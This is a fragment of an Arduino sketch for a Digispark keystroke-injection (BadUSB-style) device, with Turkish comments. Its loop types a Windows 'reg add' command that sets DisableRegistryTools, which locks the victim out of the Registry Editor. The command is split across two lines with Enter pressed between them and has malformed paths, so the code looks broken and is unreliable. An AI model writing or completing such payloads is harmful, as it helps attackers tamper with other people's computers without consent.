...
void loop() {
  ...
  DigiKeyboard.delay(1000);
  //ucuncu kod
  DigiKeyboard.print("reg add HKCU/Software/Microsoft/Windows/CurrentVersion/Policies/System /v DisableRegistryTools /t");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //dortuncu kod
  DigiKeyboard.print("REG_DWORD/d 1/f > nul");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
